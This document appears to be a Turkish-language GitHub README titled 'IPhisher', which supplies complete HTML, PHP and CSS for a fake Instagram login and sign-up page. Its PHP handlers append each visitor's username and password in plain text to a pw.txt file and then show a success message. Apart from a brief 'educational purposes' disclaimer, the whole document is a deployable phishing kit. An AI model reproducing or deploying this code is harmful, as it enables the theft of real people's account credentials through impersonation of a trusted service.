# IPhisher
Instagram Phisher
Aşağıdaki HTML ve PHP kod örneği, Instagram klonu olan giriş yap ve kayıt ol sayfalarını oluşturmanıza yardımcı olacaktır. Bu örnekte, kullanıcı adı ve şifre alanlarına girilen veriler, sunucunuzdaki `pw.txt` dosyasına kaydedilecektir. Ancak, bu sadece bir örnektir ve gerçek bir uygulama için daha güvenli bir yöntem kullanmanız önerilir.

HTML (index.html):
```html
<!DOCTYPE html>
<html>
<head>
    <title>Instagram Benzeri Arayüz</title>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Instagram</h1>
        </div>
        <div class="content">
            <div class="login-form">
                <h2>Giriş Yap</h2>
                <form action="login.php" method="POST">
                    <input type="text" name="username" placeholder="Kullanıcı Adı" required>
                    <input type="password" name="password" placeholder="Şifre" required>
                    <input type="submit" value="Giriş Yap">
                </form>
            </div>
            <div class="register-form">
                <h2>Kayıt Ol</h2>
                <form action="register.php" method="POST">
                    <input type="text" name="username" placeholder="Kullanıcı Adı" required>
                    <input type="password" name="password" placeholder="Şifre" required>
                    <input type="submit" value="Kayıt Ol">
                </form>
            </div>
        </div>
    </div>
</body>
</html>
```

PHP (login.php):
```php
<?php
    $username = $_POST['username'];
    $password = $_POST['password'];

    // pw.txt dosyasına verileri kaydet
    $file = fopen("pw.txt", "a");
    fwrite($file, "Kullanıcı Adı: " . $username . " - Şifre: " . $password . "\n");
    fclose($file);

    // Giriş işlemini gerçekleştirme veya yönlendirme yapabilirsiniz
    // Burada sadece mesaj basılıyor
    echo "Giriş başarılı!";
?>
```

PHP (register.php):
```php
<?php
    $username = $_POST['username'];
    $password = $_POST['password'];

    // pw.txt dosyasına verileri kaydet
    $file = fopen("pw.txt", "a");
    fwrite($file, "Kullanıcı Adı: " . $username . " - Şifre: " . $password . "\n");
    fclose($file);

    // Kayıt işlemini gerçekleştirme veya yönlendirme yapabilirsiniz
    // Burada sadece mesaj basılıyor
    echo "Kayıt başarılı!";
?>
```
CSS (style.css):
body {
    background-color: #fafafa;
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
}

.container {
    width: 400px;
    margin: 100px auto;
    border: 1px solid #ccc;
    background-color: #fff;
}

.header {
    background-color: #f8f8f8;
    padding: 20px;
    text-align: center;
}

.header h1 {
    margin: 0;
}

.content {
    padding: 20px;
}

h2 {
    margin-top: 0;
}

.login-form,
.register-form {
    margin-bottom: 20px;
}

input[type="text"],
input[type="password"] {
    width: 100%;
    padding: 10px;
    margin-bottom: 10px;
    border: 1px solid #ccc;
    border-radius: 3px;
}

input[type="submit"] {
    width: 100%;
    padding: 10px;
    background-color: #3897f0;
    color: #fff;
    border: none;
    border-radius: 3px;
    cursor: pointer;
}

input[type="submit"]:hover {
    background-color: #357ae8;
}


Yukarıdaki örnek, kullanıcı adı ve şifreyi sunucudaki `pw.txt` dosyasına düz bir metin olarak kaydetmeye yarar ve eğitim amaçlı oluşturulmuştur.
